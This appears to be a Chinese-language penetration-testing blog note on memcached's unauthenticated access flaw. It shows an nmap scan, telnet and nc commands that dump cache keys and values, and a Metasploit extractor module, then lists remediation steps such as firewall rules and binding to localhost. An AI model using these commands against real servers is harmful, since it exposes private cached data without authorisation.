---
title: Memcache
category:
- [Kali, Exploit]

tags:
  - null
date: 2020-12-04 20:23:36
top:
updated:
---

memcached是一套分布式的高速缓存系统。  
它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。

由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。

## 信息收集
```zsh
sudo nmap -Pn -T4 -sV -p 11211  --script memcached-info 10.198.18.1
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 15:39 CST
Nmap scan report for 10.198.18.1
Host is up (0.11s latency).

PORT      STATE SERVICE   VERSION
11211/tcp open  memcached Memcached 1.5.12 (uptime 363416 seconds)
| memcached-info:
|   Process ID: 268842
|   Uptime: 363417 seconds
|   Server time: 2020-11-27T07:39:06
|   Architecture: 64 bit
|   Used CPU (user): 245.883293
|   Used CPU (system): 676.125332
|   Current connections: 2057
|   Total connections: 786483
|   Maximum connections: 65535
|   TCP Port: 11211
|   UDP Port: 0
|_  Authentication: no

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

## Memcache数据库未授权访问

> 登录机器执行`netstat -an |more`命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。

### telnet/nc/netstat验证
```zsh
telnet 10.198.18.1 11211
stats # 查看memcache 服务状态 
stats items # 查看所有items 
stats cachedump 32 0 # 获得缓存key 
get :state:264861539228401373:261588 # 通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露
crtl+] q   # 退出telnet

nc -vv 10.198.18.1 11211
```

### MSF相关模块
#### memcached键值提取器
```zsh
msf6 auxiliary(gather/memcached_extractor) > show info

       Name: Memcached Extractor
     Module: auxiliary/gather/memcached_extractor
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Paul Deardorff <paul_deardorff@rapid7.com>

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS   10.198.18.2      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT    11211            yes       The target port (TCP)
  THREADS  1                yes       The number of concurrent threads (max one per host)
```

### 修复方案

1. 配置访问控制

建立iptables规则，只允许某一ip对memcache的端口进行访问。

```zsh
iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT
```

2. 绑定监听ip
memcache如果没有开在外网的必要，可以在memcache启动时绑定ip地址为127.0.0.1
```zsh
memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid
```

3. 使用普通账号运行，指定memcache用户运行

4. 修改默认端口
修改默认11211监听端口为其他端口
```zsh
memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid
```